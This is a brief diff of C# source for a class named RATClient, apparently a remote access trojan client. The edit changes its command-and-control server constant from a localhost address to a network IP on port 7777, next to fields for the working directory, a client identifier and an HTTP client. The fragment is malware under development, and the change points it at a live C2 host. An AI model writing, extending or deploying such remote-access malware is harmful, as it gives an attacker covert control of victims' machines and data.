@@ -9,7 +9,7 @@ using System.Threading;
 
 class RATClient
 {
-    static readonly string C2_SERVER = "http://127.0.0.1:7777";
+    static readonly string C2_SERVER = "http://192.168.19.185:7777";
     static string currentDir = Directory.GetCurrentDirectory();
     static string clientIdentifier = GetClientIdentifier();
     static readonly HttpClient client = new HttpClient();
